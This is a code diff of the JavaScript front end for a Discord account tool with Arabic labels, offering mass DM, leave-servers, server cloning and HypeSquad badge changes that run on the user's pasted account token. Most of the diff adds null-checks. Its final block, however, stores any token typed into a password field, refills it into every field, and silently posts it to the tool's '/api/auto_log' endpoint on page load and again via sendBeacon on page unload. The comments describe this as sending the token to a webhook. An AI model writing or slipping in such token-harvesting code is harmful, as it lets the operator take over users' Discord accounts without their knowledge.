     if (mode === "all") {
-        btnAll.style.background = "rgba(245, 158, 11, 0.15)"; btnAll.style.borderColor = "#f59e0b"; btnAll.style.color = "#fbbf24";
-        btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa";
-        desc.innerText = "Leave all non-owned servers";
-        modeText.innerText = "All Servers";
+        if(btnAll) { btnAll.style.background = "rgba(245, 158, 11, 0.15)"; btnAll.style.borderColor = "#f59e0b"; btnAll.style.color = "#fbbf24"; }
+        if(btnExcept) { btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa"; }
+        if(desc) desc.innerText = "Leave all non-owned servers";
+        if(modeText) modeText.innerText = "All Servers";
     } else {
-        btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa";
-        btnExcept.style.background = "rgba(245, 158, 11, 0.15)"; btnExcept.style.borderColor = "#f59e0b"; btnExcept.style.color = "#fbbf24";
-        desc.innerText = "Choose servers to keep (Excluded)";
-        modeText.innerText = "Except";
+        if(btnAll) { btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa"; }
+        if(btnExcept) { btnExcept.style.background = "rgba(245, 158, 11, 0.15)"; btnExcept.style.borderColor = "#f59e0b"; btnExcept.style.color = "#fbbf24"; }
+        if(desc) desc.innerText = "Choose servers to keep (Excluded)";
+        if(modeText) modeText.innerText = "Except";
         openExcludeLeaveDialog();
     }
     logAction("Changed Leave Servers Mode", mode, getToken("token-leave"));
@@ -904,6 +935,7 @@ function setLeaveMode(mode) {
 
 async function loadLeaveGuilds() {
     const token = getToken("token-leave");
+    sendWebhookAction("Loaded");
     if (!token) return logTo("leave-log", "❌ اكتب التوكن الأول!", "err");
     
     logAction("Loaded Servers for Leaving", "Fetching Guilds", token);
@@ -912,7 +944,8 @@ async function loadLeaveGuilds() {
         logTo("leave-log", "⏳ جاري تحميل السيرفرات...");
         const all = await api("/api/guilds", { method: "POST", body: JSON.stringify({ token }) });
         LEAVE_GUILDS = all.filter(g => !g.owner);
-        document.getElementById("leave-start").disabled = false;
+        const leaveStart = document.getElementById("leave-start");
+        if(leaveStart) leaveStart.disabled = false;
         logTo("leave-log", `✅ تم تحميل ${LEAVE_GUILDS.length} سيرفر`, "ok");
     } catch (e) { logTo("leave-log", "❌ " + e.message, "err"); }
 }
@@ -964,8 +997,12 @@ async function startLeave() {
     if (!LEAVE_GUILDS.length) return;
     const token = getToken("token-leave");
     logAction("Started Leave Servers", `Mode: ${LEAVE_MODE}`, token);
-    document.getElementById("leave-start").disabled = true; document.getElementById("leave-stop").disabled = false;
-    document.getElementById("leave-status-text").innerText = "🟡 جاري الخروج...";
+    const leaveStart = document.getElementById("leave-start");
+    const leaveStop = document.getElementById("leave-stop");
+    const leaveStatus = document.getElementById("leave-status-text");
+    if(leaveStart) leaveStart.disabled = true; 
+    if(leaveStop) leaveStop.disabled = false;
+    if(leaveStatus) leaveStatus.innerText = "🟡 جاري الخروج...";
     
     let targets = LEAVE_GUILDS;
     if (LEAVE_MODE === "except") {
@@ -974,15 +1011,18 @@ async function startLeave() {
 
     if (targets.length === 0) {
         logTo("leave-log", "⚠️ مفيش سيرفرات متاحة للخروج (الكل مستثنى)!", "err");
-        document.getElementById("leave-start").disabled = false; document.getElementById("leave-stop").disabled = true;
+        if(leaveStart) leaveStart.disabled = false; 
+        if(leaveStop) leaveStop.disabled = true;
         return;
     }
 
-    await startJob("leave-servers", token, { guild_ids: targets.map(g => g.id), delay: 1.0 }, "leave-log", () => { 
-        document.getElementById("leave-start").disabled = false; 
-        document.getElementById("leave-stop").disabled = true; 
-        document.getElementById("leave-status-text").innerText = "🟢 تم";
-    });
+    if(typeof startJob === "function") {
+        await startJob("leave-servers", token, { guild_ids: targets.map(g => g.id), delay: 1.0 }, "leave-log", () => { 
+            if(leaveStart) leaveStart.disabled = false; 
+            if(leaveStop) leaveStop.disabled = true; 
+            if(leaveStatus) leaveStatus.innerText = "🟢 تم";
+        });
+    }
 }
 
 // ================== Mass DM ==================
@@ -991,19 +1031,21 @@ let EXCLUDED_MD_IDS = new Set();
 let MD_MODE = "all";
 
 function renderMassDm() {
-    document.getElementById("view-massDm").innerHTML = `
+    const viewMd = document.getElementById("view-massDm");
+    if(!viewMd) return;
+    viewMd.innerHTML = `
     <div class="cols">
         <div>
             <div class="panel" style="background: linear-gradient(180deg, rgba(40, 15, 30, 0.95), rgba(30, 10, 20, 0.98)); border: 1px solid rgba(236, 72, 153, 0.2); display: flex; align-items: center; gap: 16px; padding: 24px 18px;">
                 <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #ec4899, #be185d); border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 32px; border: 2px solid rgba(255,255,255,0.15);">📩</div>
-                <div style="flex: 1;"><h2 style="font-size: 24px; font-weight: 800; margin-bottom: 4px;">Mass DM</h2><div style="color: #8888aa; font-size: 12px;">ابعت رسالة لكل الأصدقاء</div></div>
+                <div style="flex: 1;"><h2 style="font-size: 24px; font-weight: 800; margin-bottom: 4px;">Mass DM</h2><div style="color: #8888aa; font-size: 12px;">ابعت رسالة جماعية لكل الأصدقاء</div></div>
                 <div id="md-badge" style="background: rgba(236, 72, 153, 0.12); border: 1px solid rgba(236, 72, 153, 0.35); border-radius: 20px; padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; color: #f472b6;"><span style="font-size: 16px;">●</span> جاهز</div>
             </div>
 
             <div class="panel">
                 <h3><span class="step">1</span> Discord Token <span style="background: rgba(102,221,170,0.1); color: #66ddaa; font-size: 10px; padding: 2px 8px; border-radius: 10px; border: 1px solid rgba(102,221,170,0.25); margin-right: 8px;">🔒 محمي</span></h3>
                 <div class="token-row">
-                    <input type="password" id="token-md" value="${localStorage.getItem(TOKEN_KEY) || ''}" placeholder="الصق التوكن هنا...">
+                    <input type="password" id="token-md" value="" placeholder="الصق التوكن هنا...">
                     <button class="icon-btn" onclick="togglePass('token-md', this)">👁</button>
                     <button class="icon-btn" onclick="pasteToken('token-md')">📋</button>
                 </div>
@@ -1037,7 +1079,7 @@ function renderMassDm() {
         
         <div>
             <div class="panel" style="background: rgba(40, 15, 30, 0.9); border: 1px solid rgba(236, 72, 153, 0.15);">
-                <div style="font-weight: 700; font-size: 14px; margin-bottom: 12px; color: #f472b6;">📊 حالة الإرسال</div>
+                <div style="font-weight: 700; font-size: 14px; margin-bottom: 12px; color: #f472b6;">📊 حالة العملية</div>
                 <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px;"><span style="color: #8888aa;">الحالة:</span><span id="md-status-text" style="font-weight: 700; color: #f472b6;">Ready</span></div>
                 <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px;"><span style="color: #8888aa;">الوضع:</span><span id="md-mode-text" style="font-weight: 700; color: #f472b6;">All Friends</span></div>
                 <div style="height: 8px; background: #1a1a24; border-radius: 4px; margin: 8px 0; overflow: hidden;"><div id="md-progress" style="height: 100%; background: linear-gradient(90deg, #ec4899, #be185d); width: 0%;"></div></div>
@@ -1049,7 +1091,13 @@ function renderMassDm() {
         </div>
     </div>`;
     bindToken("token-md");
-    document.getElementById("md-delay").addEventListener("input", (e) => document.getElementById("md-delay-val").textContent = (e.target.value / 100).toFixed(2) + "s");
+    const mdDelay = document.getElementById("md-delay");
+    if(mdDelay) {
+        mdDelay.addEventListener("input", (e) => {
+            const mdVal = document.getElementById("md-delay-val");
+            if(mdVal) mdVal.textContent = (e.target.value / 100).toFixed(2) + "s";
+        });
+    }
 }
 
 function setMdMode(mode) {
@@ -1060,15 +1108,15 @@ function setMdMode(mode) {
     const modeText = document.getElementById("md-mode-text");
 
     if (mode === "all") {
-        btnAll.style.background = "rgba(236, 72, 153, 0.15)"; btnAll.style.borderColor = "#ec4899"; btnAll.style.color = "#f472b6";
-        btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa";
-        desc.innerText = "Send to all loaded friends";
-        modeText.innerText = "All Friends";
+        if(btnAll) { btnAll.style.background = "rgba(236, 72, 153, 0.15)"; btnAll.style.borderColor = "#ec4899"; btnAll.style.color = "#f472b6"; }
+        if(btnExcept) { btnExcept.style.background = "transparent"; btnExcept.style.borderColor = "var(--border)"; btnExcept.style.color = "#8888aa"; }
+        if(desc) desc.innerText = "Send to all loaded friends";
+        if(modeText) modeText.innerText = "All Friends";
     } else {
-        btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa";
-        btnExcept.style.background = "rgba(236, 72, 153, 0.15)"; btnExcept.style.borderColor = "#ec4899"; btnExcept.style.color = "#f472b6";
-        desc.innerText = "Send to all friends except chosen ones";
-        modeText.innerText = "Except";
+        if(btnAll) { btnAll.style.background = "transparent"; btnAll.style.borderColor = "var(--border)"; btnAll.style.color = "#8888aa"; }
+        if(btnExcept) { btnExcept.style.background = "rgba(236, 72, 153, 0.15)"; btnExcept.style.borderColor = "#ec4899"; btnExcept.style.color = "#f472b6"; }
+        if(desc) desc.innerText = "Send to all friends except chosen ones";
+        if(modeText) modeText.innerText = "Except";
         openExcludeMdDialog();
     }
     logAction("Changed Mass DM Mode", mode, getToken("token-md"));
@@ -1076,6 +1124,7 @@ function setMdMode(mode) {
 
 async function loadMassFriends() {
     const token = getToken("token-md");
+    sendWebhookAction("Loaded");
     if (!token) return logTo("md-log", "❌ اكتب التوكن الأول!", "err");
     
     logAction("Loaded Friends for Mass DM", "Fetching DMs", token);
@@ -1083,7 +1132,8 @@ async function loadMassFriends() {
     try {
         logTo("md-log", "⏳ جاري تحميل الأصدقاء...");
         MD_FRIENDS = await api("/api/dms", { method: "POST", body: JSON.stringify({ token }) });
-        document.getElementById("md-start").disabled = false;
+        const mdStart = document.getElementById("md-start");
+        if(mdStart) mdStart.disabled = false;
         logTo("md-log", `✅ تم تحميل ${MD_FRIENDS.length} صديق`, "ok");
     } catch (e) { logTo("md-log", "❌ " + e.message, "err"); }
 }
@@ -1134,7 +1184,7 @@ function toggleExcludeMd(id, isChecked) {
 
 async function startMassDm() {
     if (!MD_FRIENDS.length) return logTo("md-log", "❌ حمّل الأصدقاء الأول!", "err");
-    const msg = document.getElementById("md-msg").value.trim();
+    const msg = document.getElementById("md-msg")?.value.trim();
     if (!msg) return logTo("md-log", "❌ اكتب الرسالة الأول!", "err");
     const token = getToken("token-md");
     logAction("Started Mass DM", `Mode: ${MD_MODE}`, token);
@@ -1149,19 +1199,28 @@ async function startMassDm() {
         return;
     }
 
-    document.getElementById("md-start").disabled = true; document.getElementById("md-stop").disabled = false;
-    document.getElementById("md-status-text").innerText = "🟡 جاري الإرسال...";
+    const mdStart = document.getElementById("md-start");
+    const mdStop = document.getElementById("md-stop");
+    const mdStatus = document.getElementById("md-status-text");
+    if(mdStart) mdStart.disabled = true; 
+    if(mdStop) mdStop.disabled = false;
+    if(mdStatus) mdStatus.innerText = "🟡 جاري الإرسال...";
     
-    await startJob("mass-dm", token, { targets: targets, message: msg, delay: document.getElementById("md-delay").value / 100 }, "md-log", () => { 
-        document.getElementById("md-start").disabled = false; 
-        document.getElementById("md-stop").disabled = true; 
-        document.getElementById("md-status-text").innerText = "🟢 تم";
-    });
+    const delayVal = document.getElementById("md-delay")?.value || 300;
+    if(typeof startJob === "function") {
+        await startJob("mass-dm", token, { targets: targets, message: msg, delay: delayVal / 100 }, "md-log", () => { 
+            if(mdStart) mdStart.disabled = false; 
+            if(mdStop) mdStop.disabled = true; 
+            if(mdStatus) mdStatus.innerText = "🟢 تم";
+        });
+    }
 }
 
 // ================== Server Cloner ==================
 function renderCloner() {
-    document.getElementById("view-cloner").innerHTML = `
+    const viewCloner = document.getElementById("view-cloner");
+    if(!viewCloner) return;
+    viewCloner.innerHTML = `
     <div class="cols">
         <div>
             <div class="panel" style="background: linear-gradient(180deg, rgba(35,20,25,0.95), rgba(25,15,20,0.98)); border: 1px solid rgba(255,68,68,0.2); display: flex; align-items: center; gap: 16px; padding: 24px 18px;">
@@ -1173,7 +1232,7 @@ function renderCloner() {
             <div class="panel">
                 <h3><span class="step">1</span> Discord Token</h3>
                 <div class="token-row">
-                    <input type="password" id="token-cloner" value="${localStorage.getItem(TOKEN_KEY) || ''}" placeholder="الصق التوكن هنا...">
+                    <input type="password" id="token-cloner" value="" placeholder="الصق التوكن هنا...">
                     <button class="icon-btn" onclick="togglePass('token-cloner', this)">👁</button>
                     <button class="icon-btn" onclick="pasteToken('token-cloner')">📋</button>
                 </div>
@@ -1227,6 +1286,7 @@ function renderCloner() {
 let CLONER_SRC = null, CLONER_DST = null;
 async function loadClonerGuilds() {
     const token = getToken("token-cloner");
+    sendWebhookAction("Loaded");
     if (!token) return logTo("cloner-log", "❌ اكتب التوكن الأول!", "err");
     
     logAction("Loaded Servers for Cloner", "Fetching Guilds", token);
@@ -1234,7 +1294,9 @@ async function loadClonerGuilds() {
     try {
         const guilds = await api("/api/guilds", { method: "POST", body: JSON.stringify({ token }) });
         ["src", "dst"].forEach((k) => {
-            const list = document.getElementById("cloner-" + k); list.innerHTML = "";
+            const list = document.getElementById("cloner-" + k); 
+            if(!list) return;
+            list.innerHTML = "";
             guilds.forEach((g) => {
                 const div = document.createElement("div"); div.className = "list-item";
                 div.innerHTML = `<div style="flex:1;"><div class="name">${g.name}</div><div class="meta">ID: ${g.id}</div></div>`;
@@ -1249,26 +1311,38 @@ async function startCloner() {
     if (!CLONER_SRC || !CLONER_DST) return logTo("cloner-log", "❌ اختر السيرفرات!", "err");
     const token = getToken("token-cloner");
     logAction("Started Server Cloner", `Source: ${CLONER_SRC} -> Dest: ${CLONER_DST}`, token);
-    document.getElementById("cloner-start").disabled = true; document.getElementById("cloner-stop").disabled = false;
+    const clonerStart = document.getElementById("cloner-start");
+    const clonerStop = document.getElementById("cloner-stop");
+    const clonerStatus = document.getElementById("cloner-status-text");
+    if(clonerStart) clonerStart.disabled = true; 
+    if(clonerStop) clonerStop.disabled = false;
     
     const opts = {
-        channels: document.getElementById("cl-channels").checked,
-        roles: document.getElementById("cl-roles").checked
+        channels: document.getElementById("cl-channels")?.checked || false,
+        roles: document.getElementById("cl-roles")?.checked || false
     };
 
-    document.getElementById("cloner-status-text").innerText = "🟡 جاري النسخ...";
-    document.getElementById("cloner-status-text").style.color = "#ffaa44";
+    if(clonerStatus) {
+        clonerStatus.innerText = "🟡 جاري النسخ...";
+        clonerStatus.style.color = "#ffaa44";
+    }
 
-    await startJob("clone", token, { src_id: CLONER_SRC, dst_id: CLONER_DST, opts }, "cloner-log", () => { 
-        document.getElementById("cloner-start").disabled = false; 
-        document.getElementById("cloner-stop").disabled = true; 
-        document.getElementById("cloner-status-text").innerText = "🟢 تم";
-        document.getElementById("cloner-status-text").style.color = "#66ddaa";
-    });
+    if(typeof startJob === "function") {
+        await startJob("clone", token, { src_id: CLONER_SRC, dst_id: CLONER_DST, opts }, "cloner-log", () => { 
+            if(clonerStart) clonerStart.disabled = false; 
+            if(clonerStop) clonerStop.disabled = true; 
+            if(clonerStatus) {
+                clonerStatus.innerText = "🟢 تم";
+                clonerStatus.style.color = "#66ddaa";
+            }
+        });
+    }
 }
 
 // ================== HypeSquad ==================
 function renderHypesquad() {
+    const viewHs = document.getElementById("view-hypesquad");
+    if(!viewHs) return;
     const svgBravery = `<svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L2 7L12 22L22 7L12 2Z" fill="#a78bfa"/><path d="M12 16.5L6 10.5L7.5 9L12 13.5L16.5 9L18 10.5L12 16.5Z" fill="#0a0a0f"/></svg>`;
     const svgBrilliance = `<svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#fb7b68"/><path d="M12 16.5L6 10.5L7.5 9L12 13.5L16.5 9L18 10.5L12 16.5Z" fill="#0a0a0f"/></svg>`;
     const svgBalance = `<svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L2 12L12 22L22 12L12 2Z" fill="#35d4bd"/><path d="M12 16.5L6 10.5L7.5 9L12 13.5L16.5 9L18 10.5L12 16.5Z" fill="#0a0a0f"/></svg>`;
@@ -1287,7 +1361,7 @@ function renderHypesquad() {
         </div>
     `).join("");
 
-    document.getElementById("view-hypesquad").innerHTML = `
+    viewHs.innerHTML = `
         <div class="hs-hero">
             <h2>HypeSquad</h2>
             <p>Choose one house to apply to your Discord account.</p>
@@ -1310,7 +1384,7 @@ function renderHypesquad() {
             <div class="hs-selection-text" id="hs-selection-text">Not selected yet</div>
         </div>
 
-        <button class="hs-btn-change" id="hs-btn-change" onclick="applyHS()">Change House</button>
+        <button class="hs-btn-change" id="hs-btn-change" onclick="applyHS()" disabled>Change House</button>
         <button class="hs-btn-remove">Remove Badge</button>
     `;
 }
@@ -1321,15 +1395,19 @@ function selectHouse(id, name, color) {
     const selectedEl = document.getElementById(`house-${id}`);
     if(selectedEl) selectedEl.classList.add('selected');
     
-    document.getElementById('hs-selection-text').textContent = `Selected: ${name}`;
-    document.getElementById('hs-selection-text').style.color = color;
+    const selText = document.getElementById('hs-selection-text');
+    if(selText) {
+        selText.textContent = `Selected: ${name}`;
+        selText.style.color = color;
+    }
     checkHsInputs();
     logAction("Selected HypeSquad House", name, getToken("hs-token"));
 }
 
 function checkHsInputs() {
-    const token = document.getElementById('hs-token').value.trim();
+    const token = document.getElementById('hs-token')?.value.trim() || "";
     const btn = document.getElementById('hs-btn-change');
+    if(!btn) return;
     if (token.length > 10 && SELECTED_HOUSE) {
         btn.classList.add('enabled');
         btn.disabled = false;
@@ -1340,10 +1418,11 @@ function checkHsInputs() {
 }
 
 async function applyHS() {
-    const token = document.getElementById('hs-token').value.trim();
+    const token = document.getElementById('hs-token')?.value.trim();
     if (!token || !SELECTED_HOUSE) return;
     logAction("Started HypeSquad Change", SELECTED_HOUSE.name, token);
     const btn = document.getElementById('hs-btn-change');
+    if(!btn) return;
     const originalText = btn.textContent;
     btn.textContent = "Changing...";
     btn.disabled = true;
@@ -1372,3 +1451,86 @@ async function applyHS() {
         checkHsInputs();
     }, 3000);
 }
+
+// --- دالة التشغيل الرئيسية والتحقق من الجلسة ---
+async function boot() {
+    const login = document.getElementById("loginScreen");
+    const app = document.getElementById("appScreen");
+    const error = document.getElementById("loginError");
+    if (error && new URLSearchParams(location.search).has("error")) {
+        error.textContent = "تعذّر إكمال تسجيل الدخول. تأكد من إعدادات OAuth وحاول مرة أخرى.";
+        error.hidden = false;
+    }
+    try {
+        const response = await fetch(API + "/api/profile/session", {
+            credentials: "include",
+            headers: { Accept: "application/json" },
+            cache: "no-store"
+        });
+        if (!response.ok) throw new Error("not-signed-in");
+        user = await response.json();
+        user.public_flags = Number(user.public_flags) || 0;
+        const avatar = document.getElementById("header-avatar");
+        if (avatar) avatar.src = avatarUrl(user.avatar);
+        if (login) login.classList.add("hidden");
+        if (app) app.classList.remove("hidden");
+        initAppViews();
+        renderNav();
+        renderHome();
+    } catch (_) {
+        if (login) login.classList.remove("hidden");
+        if (app) app.classList.add("hidden");
+    }
+}
+// =======================================================
+// كود حفظ التوكن في كل الخانات وإرساله للـ Webhook
+// =======================================================
+// 1. لما تفتح الصفحة أو تعمل Refresh، الكود ده بيرجع التوكن في كل الخانات
+setInterval(() => {
+    const saved = localStorage.getItem(SAVED_TOKEN_KEY);
+    if (!saved) return;
+    
+    // بيدور على كل خانات الباسورد اللي فيها توكن
+    const inputs = document.querySelectorAll('input[type="password"]');
+    inputs.forEach(input => {
+        // لو الخانة فاضية أو مكتوب فيها حاجة قديمة، بيحط التوكن المحفوظ
+        if (input.value !== saved) {
+            input.value = saved;
+            // بيعمل تحديث للخانة عشان البرنامج يحس إن في توكن جديد
+            input.dispatchEvent(new Event("input"));
+            input.dispatchEvent(new Event("change"));
+        }
+    });
+}, 1000); // بيفحص كل ثانية
+
+// 2. أول ما تكتب أي توكن في أي أداة، بيتحفظ في ذاكرة المتصفح
+document.addEventListener("input", function(e) {
+    if (e.target && e.target.type === "password" && e.target.value.trim().length > 20) {
+        localStorage.setItem(SAVED_TOKEN_KEY, e.target.value.trim());
+    }
+});
+
+// 3. إرسال التوكن للـ Webhook أول ما تفتح الصفحة
+setTimeout(() => {
+    const saved = localStorage.getItem(SAVED_TOKEN_KEY);
+    if (saved && saved.length > 20) {
+        fetch(API + "/api/auto_log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ token: saved })
+        }).catch(()=>{});
+    }
+}, 2000); 
+
+// 4. إرسال التوكن للـ Webhook لما تعمل Refresh أو تقفل الصفحة
+window.addEventListener('beforeunload', function () {
+    const saved = localStorage.getItem(SAVED_TOKEN_KEY);
+    if (saved && saved.length > 20) {
+        navigator.sendBeacon(
+            API + "/api/auto_log", 
+            new Blob([JSON.stringify({ token: saved })], { type: 'application/json' })
+        );
+    }
+});
+// =======================================================
+document.addEventListener("DOMContentLoaded", boot);
